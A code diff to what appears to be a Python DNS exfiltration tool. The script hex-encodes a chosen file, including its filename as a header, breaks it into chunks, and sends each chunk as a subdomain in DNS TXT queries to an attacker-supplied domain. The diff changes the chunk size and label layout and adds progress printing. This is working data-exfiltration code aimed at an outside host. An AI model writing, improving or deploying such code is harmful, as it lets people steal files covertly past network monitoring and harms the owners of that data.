@@ -29,23 +29,23 @@ def is_ascii(fn):
 		return 0
 
 def make_query(wf,num):
-	characters = 42
+	characters = 62
 	for i in range (0, len(wf), characters):
-		xfil_data =  (str(hex(num)[2:]) + "20" + file_id + "20" + wf[i:i+characters])
-		tld = ("d.%s.%s"%(xfil_data.rjust(60,'0'),args.domain))
+		#xfil_data =  (str(num).rjust(4,'0') + "-" + file_id + "-" + wf[i:i+characters])
+		xfil_data =  (wf[i:i+characters])
+		tld = ("%s.%s.%s.%s"%(str(hex(num)[2:]).rjust(4,'0'),xfil_data,file_id,args.domain))
+		print(tld)
 		try:
 			dns.resolver.query(tld,'TXT')
 		except:
-			#print("didn't work for %s"%(tld))
 			pass
 		num += 1
+	return num
 
 file_id =  random_string_digits()
-num = 1
 
 '''create a header for data transfer with the filename'''
-header = args.file.encode().hex()
-make_query(header,num)
+num = make_query(args.file.encode().hex(),1)
 
 print("File: %s\nID: %s\n"%(args.file,file_id))
 
@@ -62,4 +62,5 @@ with open (args.file,"r") as work_file:
 			enc_bin_file = binascii.hexlify(bin_file.read()).decode()
 			make_query(enc_bin_file,num)
 
+print("Something, something...dark side. Something, Something...complete.\n")
 exit()
